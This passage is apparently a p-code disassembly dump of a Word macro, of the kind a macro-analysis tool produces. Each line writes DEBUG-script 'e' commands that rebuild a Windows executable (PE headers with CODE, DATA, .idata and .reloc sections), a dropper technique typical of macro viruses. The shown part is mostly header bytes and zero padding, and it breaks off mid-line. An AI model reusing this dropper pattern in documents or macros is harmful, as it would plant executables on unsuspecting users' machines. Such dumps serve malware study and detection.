' 	ArgsMemCall Insert 0x0001 
' Line #32:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02a0 00 50 00 00 78 01 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #33:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #34:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #35:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #36:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #37:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #38:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0300 00 20 00 00 00 10 00 00 00 12 00 00 00 06 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #39:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #40:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 30 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #41:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0330 00 02 00 00 00 18 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #42:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #43:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0350 00 10 00 00 00 40 00 00 00 02 00 00 00 1a 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #44:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #45:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 50 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #46:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0380 00 02 00 00 00 1c 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #47:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #48:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #49:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #50:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #51:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #52:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #53:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #54:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #55:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #56:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #57:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #58:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #59:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #60:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #61:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #62:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #63:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #64:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #65:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #66:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #67:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #68:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #69:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #70:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #71:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #72:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #73:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #74:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #75:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #76:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #77:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #78:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #79:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #80:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #81:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #82:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #83:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #84:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #85:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 05f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #86:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
